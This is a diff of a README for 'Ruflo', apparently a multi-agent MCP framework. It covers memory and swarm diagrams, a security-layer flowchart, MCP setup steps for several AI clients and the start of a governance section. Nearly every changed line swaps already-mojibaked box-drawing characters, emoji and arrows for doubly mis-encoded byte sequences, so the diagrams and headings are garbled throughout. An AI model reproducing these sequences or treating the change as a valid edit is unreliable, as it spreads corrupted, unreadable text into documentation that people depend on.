-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š  Episodic Memory                            Ã¢â€â€š  Ã¢â€ Â Recent patterns, moderate retention
-Ã¢â€â€š  Importance Ãƒâ€” retention score ranking       Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š  Semantic Memory                            Ã¢â€â€š  Ã¢â€ Â Consolidated knowledge, persistent
-Ã¢â€â€š  Promoted from episodic via consolidation   Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Working Memory                             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬Â Ã‚Â Active context, fast access
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Size-based eviction (1MB limit)            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Episodic Memory                            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬Â Ã‚Â Recent patterns, moderate retention
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Importance ÃƒÆ’Ã¢â‚¬â€ retention score ranking       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Semantic Memory                            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬Â Ã‚Â Consolidated knowledge, persistent
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Promoted from episodic via consolidation   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 </details>
 
 <details>
-<summary>Ã°Å¸ÂÂ <strong>Swarm Topology</strong> Ã¢â‚¬â€ Multi-agent coordination patterns</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â <strong>Swarm Topology</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Multi-agent coordination patterns</summary>
 
 ```mermaid
 flowchart TB
-    subgraph Hierarchical["Ã°Å¸â€˜â€˜ Hierarchical (Default)"]
+    subgraph Hierarchical["ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ¢â‚¬Ëœ Hierarchical (Default)"]
         Q1[Queen] --> W1[Worker 1]
         Q1 --> W2[Worker 2]
         Q1 --> W3[Worker 3]
     end
 
-    subgraph Mesh["Ã°Å¸â€¢Â¸Ã¯Â¸Â Mesh"]
+    subgraph Mesh["ÃƒÂ°Ã…Â¸Ã¢â‚¬Â¢Ã‚Â¸ÃƒÂ¯Ã‚Â¸Ã‚Â Mesh"]
         M1[Agent] <--> M2[Agent]
         M2 <--> M3[Agent]
         M3 <--> M1[Agent]
     end
 
-    subgraph Ring["Ã°Å¸â€™Â Ring"]
+    subgraph Ring["ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â Ring"]
         R1[Agent] --> R2[Agent]
         R2 --> R3[Agent]
         R3 --> R1
     end
 
-    subgraph Star["Ã¢Â­Â Star"]
+    subgraph Star["ÃƒÂ¢Ã‚Â­Ã‚Â Star"]
         S1[Hub] --> S2[Agent]
         S1 --> S3[Agent]
         S1 --> S4[Agent]
@@ -1208,30 +1208,30 @@ flowchart TB
 </details>
 
 <details>
-<summary>Ã°Å¸â€â€™ <strong>Security Layer</strong> Ã¢â‚¬â€ Threat detection and prevention</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â„¢ <strong>Security Layer</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Threat detection and prevention</summary>
 
 ```mermaid
 flowchart TB
-    subgraph Input["Ã°Å¸â€œÂ¥ Input Validation"]
+    subgraph Input["ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¥ Input Validation"]
         Req[Request] --> Scan[AIDefence Scan]
         Scan --> PII[PII Detection]
         Scan --> Inject[Injection Check]
         Scan --> Jailbreak[Jailbreak Detection]
     end
 
-    subgraph Decision["Ã¢Å¡â€“Ã¯Â¸Â Decision"]
+    subgraph Decision["ÃƒÂ¢Ã…Â¡Ã¢â‚¬â€œÃƒÂ¯Ã‚Â¸Ã‚Â Decision"]
         PII --> Risk{Risk Level}
         Inject --> Risk
         Jailbreak --> Risk
     end
 
-    subgraph Action["Ã°Å¸Å½Â¬ Action"]
-        Risk -->|Safe| Allow[Ã¢Å“â€¦ Allow]
-        Risk -->|Warning| Sanitize[Ã°Å¸Â§Â¹ Sanitize]
-        Risk -->|Threat| Block[Ã¢â€ºâ€ Block]
+    subgraph Action["ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¬ Action"]
+        Risk -->|Safe| Allow[ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Allow]
+        Risk -->|Warning| Sanitize[ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â¹ Sanitize]
+        Risk -->|Threat| Block[ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â Block]
     end
 
-    subgraph Learn["Ã°Å¸â€œÅ¡ Learning"]
+    subgraph Learn["ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â¡ Learning"]
         Allow --> Log[Log Pattern]
         Sanitize --> Log
         Block --> Log
@@ -1243,12 +1243,12 @@ flowchart TB
 
 ---
 
-## Ã°Å¸â€Å’ Setup & Configuration
+## ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ…â€™ Setup & Configuration
 
 Connect Ruflo to your development environment.
 
 <details>
-<summary>Ã°Å¸â€Å’ <strong>MCP Setup</strong> Ã¢â‚¬â€ Connect Ruflo to Any AI Environment</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ…â€™ <strong>MCP Setup</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Connect Ruflo to Any AI Environment</summary>
 
 Ruflo runs as an MCP (Model Context Protocol) server, allowing you to connect it to any MCP-compatible AI client. This means you can use Ruflo's 100+ agents, swarm coordination, and self-learning capabilities from Claude Desktop, VS Code, Cursor, Windsurf, ChatGPT, and more.
 
@@ -1260,13 +1260,13 @@ npx ruflo@latest mcp start
 ```
 
 <details open>
-<summary>Ã°Å¸â€“Â¥Ã¯Â¸Â <strong>Claude Desktop</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬â€œÃ‚Â¥ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Claude Desktop</strong></summary>
 
 **Config Location:**
 - macOS: `~/Library/Application Support/Claude/claude_desktop_config.json`
 - Windows: `%APPDATA%\Claude\claude_desktop_config.json`
 
-**Access:** Claude Ã¢â€ â€™ Settings Ã¢â€ â€™ Developers Ã¢â€ â€™ Edit Config
+**Access:** Claude ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Settings ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Developers ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Edit Config
 
 ```json
 {
@@ -1289,7 +1289,7 @@ Restart Claude Desktop after saving. Look for the MCP indicator (hammer icon) in
 </details>
 
 <details>
-<summary>Ã¢Å’Â¨Ã¯Â¸Â <strong>Claude Code (CLI)</strong></summary>
+<summary>ÃƒÂ¢Ã…â€™Ã‚Â¨ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Claude Code (CLI)</strong></summary>
 
 ```bash
 # Add via CLI (recommended)
@@ -1307,7 +1307,7 @@ Restart Claude Desktop after saving. Look for the MCP indicator (hammer icon) in
 </details>
 
 <details>
-<summary>Ã°Å¸â€™Â» <strong>VS Code</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â» <strong>VS Code</strong></summary>
 
 **Requires:** VS Code 1.102+ (MCP support is GA)
 
@@ -1339,7 +1339,7 @@ Create `.vscode/mcp.json` in your project:
 </details>
 
 <details>
-<summary>Ã°Å¸Å½Â¯ <strong>Cursor IDE</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ <strong>Cursor IDE</strong></summary>
 
 **Method 1: One-Click** (if available in Cursor MCP marketplace)
 
@@ -1368,11 +1368,11 @@ Create `.cursor/mcp.json` in your project (or global config):
 </details>
 
 <details>
-<summary>Ã°Å¸Ââ€ž <strong>Windsurf IDE</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂÃ¢â‚¬Å¾ <strong>Windsurf IDE</strong></summary>
 
 **Config Location:** `~/.codeium/windsurf/mcp_config.json`
 
-**Access:** Windsurf Settings Ã¢â€ â€™ Cascade Ã¢â€ â€™ MCP Servers, or click the hammer icon in Cascade panel
+**Access:** Windsurf Settings ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Cascade ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ MCP Servers, or click the hammer icon in Cascade panel
 
 ```json
 {
@@ -1395,12 +1395,12 @@ Click **Refresh** in the MCP settings to connect. Windsurf supports up to 100 MC
 </details>
 
 <details>
-<summary>Ã°Å¸Â¤â€“ <strong>ChatGPT</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â¤Ã¢â‚¬â€œ <strong>ChatGPT</strong></summary>
 
 **Requires:** ChatGPT Pro or Plus subscription with Developer Mode enabled
 
 **Setup:**
-1. Go to **Settings Ã¢â€ â€™ Connectors Ã¢â€ â€™ Advanced**
+1. Go to **Settings ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Connectors ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Advanced**
 2. Enable **Developer Mode** (beta)
 3. Add your MCP Server in the **Connectors** tab
 
@@ -1420,7 +1420,7 @@ Then add the server URL in ChatGPT Connectors settings.
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Âª <strong>Google AI Studio</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Âª <strong>Google AI Studio</strong></summary>
 
 Google AI Studio supports MCP natively since May 2025, with managed MCP servers for Google services (Maps, BigQuery, etc.) launched December 2025.
 
@@ -1451,12 +1451,12 @@ const mcpConfig = {
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Â  <strong>JetBrains IDEs</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>JetBrains IDEs</strong></summary>
 
 JetBrains AI Assistant supports MCP for IntelliJ IDEA, PyCharm, WebStorm, and other JetBrains IDEs.
 
 **Setup:**
-1. Open **Settings Ã¢â€ â€™ Tools Ã¢â€ â€™ AI Assistant Ã¢â€ â€™ MCP**
+1. Open **Settings ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Tools ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ AI Assistant ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ MCP**
 2. Click **Add Server**
 3. Configure:
 
@@ -1511,7 +1511,7 @@ export CLAUDE_FLOW_TOOL_MODE=develop
 
 ### Security Best Practices
 
-Ã¢Å¡Â Ã¯Â¸Â **Never hardcode API keys in config files checked into version control.**
+ÃƒÂ¢Ã…Â¡Ã‚Â ÃƒÂ¯Ã‚Â¸Ã‚Â **Never hardcode API keys in config files checked into version control.**
 
 ```bash
 # Use environment variables instead
@@ -1526,13 +1526,13 @@ echo "ANTHROPIC_API_KEY=sk-ant-..." >> .env
 ---
 
 <details>
-<summary>Ã°Å¸â€ºÂ¡Ã¯Â¸Â <strong>@claude-flow/guidance</strong> Ã¢â‚¬â€ Long-horizon governance control plane for Claude Code agents</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>@claude-flow/guidance</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Long-horizon governance control plane for Claude Code agents</summary>
 
 ### Overview
 
-`@claude-flow/guidance` turns `CLAUDE.md` into a runtime governance system with enforcement gates, cryptographic proofs, and feedback loops. Agents that normally drift after 30 minutes can now operate for days Ã¢â‚¬â€ rules are enforced mechanically at every step, not remembered by the model.
+`@claude-flow/guidance` turns `CLAUDE.md` into a runtime governance system with enforcement gates, cryptographic proofs, and feedback loops. Agents that normally drift after 30 minutes can now operate for days ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â rules are enforced mechanically at every step, not remembered by the model.
 
-**7-phase pipeline:** Compile Ã¢â€ â€™ Retrieve Ã¢â€ â€™ Enforce Ã¢â€ â€™ Trust Ã¢â€ â€™ Prove Ã¢â€ â€™ Defend Ã¢â€ â€™ Evolve
